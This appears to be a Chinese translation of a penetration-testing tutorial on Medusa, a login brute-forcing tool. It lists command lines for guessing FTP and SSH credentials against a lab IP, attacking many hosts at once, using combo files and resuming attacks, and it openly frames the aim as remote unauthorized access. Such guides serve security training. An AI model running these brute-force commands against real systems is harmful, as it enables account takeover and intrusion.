## medusa综合指南 [^1]

- Introduction to Medusa and its features
  - Medusa是一个快速，并行，模块化的登录暴力破解工具。目标是支持尽可能多的允许远程身份验证的服务。作者将以下项目视为此应用程序的一些主要功能：
    - 基于线程的并行测试。可以同时对多个主机，用户或密码执行暴力测试。
    - 灵活的用户输入。可以通过多种方式指定目标信息（主机/用户/密码）。例如，每个项目可以是单个条目，也可以是包含多个条目的文件。此外，组合文件格式允许用户优化其目标列表。
    - 模块化设计。每个服务模块都作为独立的.mod文件存在。这意味着不需要对核心应用程序进行任何修改，以扩展支持的强制服务列表。
    - 支持多种协议。目前支持许多服务（例如SMB，HTTP，POP3，MS-SQL，SSHv2等）
  - **语法：** Medusa [-h host | -H file] [-u username | -U file] [-p password | -P file] [-C file] -M module [OPT]
  - `medusa -d`
- Password Cracking For Specific Username
  - `medusa -h 192.168.1.108 -u raj -P pass.txt -M ftp`
- Username Cracking for Specific Password
  - `medusa -h 192.168.1.108 -U user.txt -p 123 -M ftp`
- Cracking Login Credential
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp`
- Making Brute Force Attack on Multiple Host
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp`
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 1` [^2]
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 2` [^3]
- Attacking on Specific Port Instead of Default
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ssh`
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ssh -n 2222`
- NULL/Same as Login Attempt
  - `medusa -h 192.168.1.108 -u raj -P pass.txt -M ftp -e ns` [^4]
- Save logs to Disk
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -O log.txt` [^5]
- Stop on Success
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -f` [^6]
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -F `[^7]
- Suppress Startup Banner
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -b` [^8]
- Verbose Mode
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -v 1` [^9]
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -v 2`
  - `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -v 6`
- Error Debugging Mode
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -w 01` [^10]
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -w 06`
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -w 07`
- Using Combo Entries
  - `medusa -M ftp -C userpass.txt` [^11]
- Resuming the Brute Force Attack
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp` [^12]
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -Z h1u2u3. `[^13]
  - `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -Z h1u3u4.` [^14]

[原文](https://www.hackingarticles.in/comprehensive-guide-on-medusa-a-brute-forcing-tool/)

---

[^1]: 今天我们将讨论 - Medusa在破解各种协议的登录凭证方面有多大影响，以便远程未经授权地访问系统。在本文中，我们讨论了Medusa中可用的各种选项，以便在各种场景中进行暴力攻击。
[^2]: 如果您的主机列表中有多个主机IP，并且您希望仅对少数主机进行强力攻击，则使用**-T选项**同时测试要测试的主机总数。
[^3]: 从下面给出的情况可以看出，第一个命令对单个主机IP进行暴力攻击，而在第二个命令中，它同时对两个主机IP进行暴力攻击
[^4]: Using option **-e along with ns** enables three parameters **n**ull/**s**ame as login while making brute force attack on the password field.
[^5]: 出于记录维护，更好的可读性和未来参考的目的，我们将Medusa强力攻击的输出保存到文件中。为此，我们将使用 Medusa 的**参数-O**将输出保存在文本文件中。
[^6]: 假设在使用主机列表时，您希望在找到第一个有效的用户名/密码后停止对主机的暴力攻击，那么您可以单独使用**-f选项**和命令。
[^7]: 即使您在命令中的任何主机上找到第一个有效的用户名/密码后，也可以使用**-F选项**来停止审核
[^8]: 如果你想在进行暴力攻击时隐藏美杜莎的横幅，那么使用**-b选项**来抑制启动横幅。
[^9]: **详细模式**详细模式有六个级别来检查攻击详细信息，还包含一个错误调试选项，其中包含调试模式的十个级别。您可以对verbose参数使用**-v选项**，对错误调试参数使用**-w选项**
[^10]: **错误调试模式**如上所述，在每个级别检查蛮力攻击的级别为0-10，在这里你将观察到0-6的结果是大约。同样几乎没有差别，7-10级的结果是大约。同样但从0-6级别变化。调试模式显示等待时间，套接字，发送数据大小和接收的数据大小，模块详细信息和路径。
[^11]: **使用组合条目**使用**-C选项**启用组合文件参数，组合文件应该每行有一个记录，并以冒号分隔的格式为**host_IP：username：password**。如果三个字段中的任何一个留空，则相应的信息应作为全局值或作为文件中的列表传递。
[^12]: **恢复蛮力攻击**有时候在进行强力攻击时，攻击会暂时停止/停止或意外取消以节省您的时间，您可以使用**-z选项**启用resume参数并继续从最后一次删除的字典尝试中强制执行而不是启动它从第一次尝试。
[^13]: 您可以观察下面给定图像的输出结果，在按下ctrl C之后它会停止攻击，然后在命令中添加突出显示的文本以恢复攻击并继续它。
[^14]: 重复上面的操作，现在比较执行所有三个命令后的结果，你会发现它继续从最后一次删除尝试中强制执行